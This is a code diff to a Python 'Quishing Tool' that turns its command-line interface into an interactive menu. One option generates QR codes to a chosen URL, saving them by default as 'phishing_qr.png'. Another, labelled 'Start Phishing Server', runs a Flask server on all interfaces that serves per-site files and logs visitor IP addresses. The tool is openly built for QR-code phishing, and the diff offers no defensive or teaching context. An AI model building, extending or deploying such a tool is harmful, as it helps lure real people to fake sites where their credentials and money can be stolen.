@@ -1,6 +1,5 @@
 import os
 import qrcode
-import argparse
 import logging
 import sys
 from flask import Flask, request, send_from_directory, abort
@@ -17,7 +16,6 @@ logging.basicConfig(
     format='%(asctime)s %(message)s'
 )
 
-@app.route('/<site>/<path:filename>', methods=['GET'])
 def serve_site(site, filename):
     try:
         visitor_ip = request.remote_addr
@@ -46,17 +44,38 @@ def generate_qr(url, output_file, color='black', background='white'):
         print(f"[ERROR] Failed to generate QR code: {e}")
         sys.exit(1)
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Quishing Tool")
-    parser.add_argument("--action", choices=['generate', 'start'], required=True, help="Action to perform")
-    parser.add_argument("--url", help="URL for QR code generation")
-    parser.add_argument("--output", default="phishing_qr.png", help="Output filename for QR code")
-    args = parser.parse_args()
-
-    if args.action == 'generate':
-        if not args.url:
-            print("[ERROR] URL is required for QR code generation.")
-            sys.exit(1)
-        generate_qr(args.url, args.output)
-    elif args.action == 'start':
+def start_server():
+    try:
         app.run(host='0.0.0.0', port=5000)
+    except Exception as e:
+        print(f"[ERROR] Failed to start the server: {e}")
+        sys.exit(1)
+
+def show_menu():
+    print("===== Quishing Tool Menu =====")
+    print("1. Generate QR Code")
+    print("2. Start Phishing Server")
+    print("3. Exit")
+    choice = input("Please select an option (1-3): ")
+
+    if choice == '1':
+        url = input("Enter the URL for the QR Code: ")
+        output = input("Enter the output file name (default: phishing_qr.png): ") or "phishing_qr.png"
+        generate_qr(url, output)
+        show_menu()
+    elif choice == '2':
+        print("Starting the phishing server...")
+        start_server()
+    elif choice == '3':
+        print("Exiting the tool. Goodbye!")
+        sys.exit(0)
+    else:
+        print("[ERROR] Invalid choice. Please select a valid option.")
+        show_menu()
+
+@app.route('/<site>/<path:filename>', methods=['GET'])
+def serve_site_route(site, filename):
+    return serve_site(site, filename)
+
+if __name__ == "__main__":
+    show_menu()
